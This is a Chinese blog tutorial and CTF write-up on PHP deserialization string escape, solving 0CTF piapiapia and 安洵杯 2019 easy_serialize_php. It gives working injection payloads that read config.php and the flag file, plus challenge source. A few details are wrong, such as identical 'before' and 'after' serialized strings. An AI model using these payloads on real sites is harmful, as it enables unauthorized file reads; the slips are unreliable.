---
title: php反序列化字符串逃逸
date: 2020-07-19 09:50:06
updated: 2020-07-19 09:50:06
categories: web
---



要学习反序列化字符串逃逸之前，我们需要知道php反序列化的几大特性。<!--more-->

> 1.PHP 在反序列化时，底层代码是以 `;` 作为字段的分隔，以 `}` 作为结尾(字符串除外)，并且是根据长度判断内容的 .

> 2.当长度不对应的时候会出现报错

> 3.可以反序列化类中不存在的元素

## 反序列化字符串逃逸
```
 1.过滤后字符变多
 2.过滤后字符变少
```

### 过滤后字符变多

![](https://img.npfs06.top/20210306095339.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210306095358.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



![](https://img.npfs06.top/20210306095420.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

当我们传入？name =npfsx 时，由于溢出，反序列化失败，这个时候我们就可以利用这里的溢出，构造注入，实现字符串逃逸

![](https://img.npfs06.top/20210306095431.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

其实总的来说就是因为执行text函数将一个字符（x),替换成两个字符 (66), 使字符串膨胀，造成了之后的序列化中，多出来的这些字符抢占了本属于`";i:1;s:6:"hacker";}`的位子，使其溢出，而我们要做的就是使溢出的这部分在闭合前一字符串的同时，符合php反序列化规则，能够被成功反序列化

所以`";i:1;s:6:"hacker";}`这一部分前面的字符`";`就是我们用来闭合前面字符串的，这样剩下的`i:1;s:6:"hacker"`这一部分符合反序列化规则，最后的`;}`是用来闭合反序列化全过程的，这样原来的`";i:1;s:14:"hello everyone";}`就会被舍弃，而不影响反序列化过程

---

### 过滤后字符变少

![](https://img.npfs06.top/20210306095446.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210306095522.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210306095456.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



![](https://img.npfs06.top/20210306095536.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

总的来说就是由于缩水，导致前面的字符被吃掉了，所以执行了我们后面构造的代码



---



## **0CTF piapiapia**

使其主要的代码就四部分

先拿seay审下（第一次用，发现真是神器啊2333）

![](https://img.npfs06.top/20210306095552.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

可以发现config.php里有个flag
![](https://img.npfs06.top/20210306095603.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

我们在register.php页面注册，在index.php页面登入之后，来到update.php页面，我们可以看到这个页面是一个文件上传页面，结合seay，审计代码，发现这里有一个序列化的过程，同时在序列化之前会对我们输入的Phone、Email、Nickname、Photo进行正则匹配（phone要类似于11位数组的构造，email要类似于123@qq.com这样邮箱的构造，这两种都是不符合则die，而Nickname恰恰相反，它是如果匹配到非字符数字下划线或者长度超过10则die，这里可以用数组绕过）

![](https://img.npfs06.top/20210306095618.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

这里有个update_profile函数，我们追溯看看

![](https://img.npfs06.top/20210306095631.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

可以发现里面有个filter函数，继续追溯

![](https://img.npfs06.top/20210306095643.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

通过审计发现会将字符串中的`\`和`\\\\`	替换成下划线，也会将部分字符替换成hacker,这里细心点可以发现这些字符串里面只有where是5位的，其他都是6位的

---

回到update.php页面，尝试上传文件，来到了profile.php页面，审计代码，发现这里有个反序列化操作，还有一个文件读取操作

![](https://img.npfs06.top/20210306095655.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

其实看到这里，大概思路应该就有了，flag在config.php中，我们在上传页面参数被序列化，再经历一系列替换之后，再进行反序列化，同时还有文件读取

php反序列化字符串逃逸的常见套路，我们可以将config.php作为逃逸字符串，经过一系列变化后，读取出来

最终payload

```
nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```

![](https://img.npfs06.top/20210306095712.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

上传后来到profile.php页面，读取源码，base64解密，即可得到flag

这里为什么要构造nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}其实如果看懂我上面写的`过滤后字符变多`这一模块后是很好理解的

filter函数会将where替换成hacker，字符数增加1，字符串膨胀

> ";}s:5:"photo";s:10:"config.php";}   

这一部分一共34个字符，这也就以为这当我们构造34个where时，当where被替换成hacker之后，会多出34个字符，使得";}s:5:"photo";s:10:"config.php";}  被向后推，从而替代了photo的序列化结果

**替换前**


```
a:4{s:5:"phone";s:11:"12345678901";s:5:"email";s:10:"123@qq.com";s:8:"nickname";s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}";s:39:"upload/804f743824c0451b2f60d81b63b6a900";}
```

**替换后**
```
a:4{s:5:"phone";s:11:"12345678901";s:5:"email";s:10:"123@qq.com";s:8:"nickname";s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}";s:39:"upload/804f743824c0451b2f60d81b63b6a900";}
```

---

## **[安洵杯 2019]easy_serialize_php**

这一题考察的是过滤后字符变少

```
 <?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```

具体过程我就不写了，参考上文`过滤后字符变少`板块，

本地测试脚本如下：

```
<?php

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
$_SESSION["user"] = 'L2QwZzNfZmxsbGxsbGFn';
$_SESSION['function'] ='a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"aa";s:2:"ss";}';
$_SESSION["img"]='ZDBnM19mMWFnLnBocA==';
$serialize_info = filter(serialize($_SESSION));
echo $serialize_info;
$userinfo = unserialize($serialize_info);
?>

```



payload:

> GET   ?f=show_image

> POST SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"aa";s:2:"ss";}

查看源码，$flag = 'flag in /d0g3_fllllllag';

所以构造

payload

> GET  ?f=show_image

> POST   SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"aa";s:2:"ss";}

得到flag